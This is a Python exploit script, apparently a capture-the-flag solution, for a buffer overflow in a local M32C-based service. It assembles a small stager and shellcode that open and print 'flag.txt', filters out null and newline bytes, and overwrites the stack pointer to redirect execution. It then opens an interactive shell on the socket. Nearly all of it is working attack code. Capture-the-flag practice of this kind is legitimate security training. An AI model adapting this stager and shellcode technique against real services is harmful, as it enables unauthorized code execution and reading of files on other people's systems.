stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
# 1488:	e4 00       	cmp.b:s #0,r0l
    mov.w #0x1488, a0
    mov.w:g #0x0404, [a0]
    jmp.w 0x1400 - (0x1af6 + 12 - 4)
.ascii "%s"
'''
asm = '''.section .text
.global _start
.ascii "%s"
_start:
    jmp.w get_addr
ret:
    pop.w r3
open:
    mov.w r3, r1
    xor.w r2, r2
    mov.w:q	#2, r0
    mov.w:g	r0, 0x400
read:
    mov.w r0, r1
    mov.w r3, r2
    push.w:g #0x7f
    mov.w:q	#4, r0
    mov.w:g	r0, 0x400
write:
    mov.w #1, r1
    mov.w r3, r2
    push.w:g #0x7f
    mov.w:q	#5, r0
    mov.w:g	r0, 0x400
    jmp.w write
get_addr:
    jsr.w ret
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'm32c'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 18

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10016
s = mysock(IP, PORT)

SP = 0x1af6
sl(s, '\n000')
first = stager + p16(SP) + '\n'
sl(s, first)

SP = 0x1af6 + BUF_SIZE + 3
sl(s, '\n000')
shellcode = 'A' * BUF_SIZE + p16(SP) + '\x00' + shellcode + '\n'
sl(s, shellcode)

shell(s)
